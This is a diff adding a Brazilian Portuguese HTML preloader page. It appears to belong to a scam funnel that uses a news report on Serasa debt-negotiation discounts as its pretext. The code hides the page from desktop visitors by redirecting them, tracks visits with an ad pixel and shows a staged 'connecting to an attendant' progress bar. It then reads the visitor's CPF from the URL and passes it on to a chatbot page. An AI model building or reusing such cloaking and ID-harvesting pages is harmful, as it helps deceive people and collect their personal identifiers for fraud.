@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <script
+      src="scripts/utms/latest-1.js"
+      data-utmify-prevent-subids=""
+      async=""
+      defer=""
+    ></script>
+    <script>
+      window.pixelId = "67f846e3e19eff9c461bb215";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <script type="text/javascript">
+      // Verifica o dispositivo e redireciona antes de carregar outros recursos
+      if (
+        !/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(
+          navigator.userAgent
+        ) &&
+        window.innerWidth > 768
+      ) {
+        window.location.replace(
+          //"https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2025-09/negociacao-de-dividas-serasa-realiza-acao-com-descontos-de-ate-99"
+        );
+      }
+    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Preloader</title>
+    <style>
+      /* Preloader - Tela de Carregamento */
+      #preloader {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: white;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        visibility: visible;
+        opacity: 1;
+        transition: opacity 1s ease, visibility 1s ease;
+      }
+
+      /* Barra de Progresso */
+      .progress-bar {
+        width: 80%;
+        height: 10px;
+        background-color: #d8d8d8;
+        border-radius: 5px;
+        position: relative;
+        overflow: hidden;
+        margin-top: 20px;
+      }
+
+      .progress-bar-fill {
+        height: 100%;
+        width: 0%;
+        background-color: #d72a80;
+        transition: width 2s ease;
+      }
+
+      /* Texto de Status */
+      .status-text {
+        font-family: "Inter", sans-serif;
+        font-weight: 900;
+        font-size: 28px;
+        color: black;
+        text-align: center;
+        opacity: 0;
+        transition: transform 0.5s ease, opacity 0.5s ease;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Preloader -->
+    <div id="preloader">
+      <div class="status-text" id="status-text">
+        Conectando a um atendente...
+      </div>
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="progress-bar-fill"></div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        setTimeout(() => {
+          let preloader = document.getElementById("preloader");
+          let statusText = document.getElementById("status-text");
+          let progressBar = document.getElementById("progress-bar-fill");
+
+          // 🔹 Função para capturar o CPF diretamente da URL
+          function getCPFfromURL() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("cpf"); // Captura o CPF da URL
+          }
+
+          // 🔹 Recupera o CPF da URL
+          const cpf = getCPFfromURL();
+
+          // 🔹 Verifica se o CPF foi encontrado antes de continuar
+          if (!cpf) {
+            alert("Erro: CPF não encontrado na URL!");
+            return;
+          }
+
+          console.log("✅ CPF recebido na Página 2:", cpf);
+
+          // Exibe primeiro status
+          statusText.style.opacity = 1;
+          statusText.style.transform = "translateY(0)";
+          progressBar.style.width = "30%";
+
+          setTimeout(() => {
+            statusText.innerText = "Processando...";
+            statusText.style.opacity = 0;
+            statusText.style.transform = "translateY(20px)";
+
+            setTimeout(() => {
+              statusText.style.opacity = 1;
+              statusText.style.transform = "translateY(0)";
+              progressBar.style.width = "60%";
+            }, 300);
+          }, 2000);
+
+          setTimeout(() => {
+            statusText.innerText = "Tudo pronto!";
+            statusText.style.opacity = 0;
+            statusText.style.transform = "translateY(20px)";
+
+            setTimeout(() => {
+              statusText.style.opacity = 1;
+              statusText.style.transform = "translateY(0)";
+              progressBar.style.width = "100%";
+            }, 300);
+          }, 4000);
+
+          setTimeout(() => {
+            preloader.style.opacity = 0;
+            preloader.style.visibility = "hidden";
+
+            // 🔹 Redireciona para o Typebot com o CPF na URL
+            const urlFinal = `./atendimento.html?${new URLSearchParams(
+              window.location.search
+            )}`;
+            console.log("🔹 Redirecionando para:", urlFinal);
+            window.location.href = urlFinal;
+          }, 6000);
+        }, 400);
+      });
+    </script>
+  </body>
+</html>
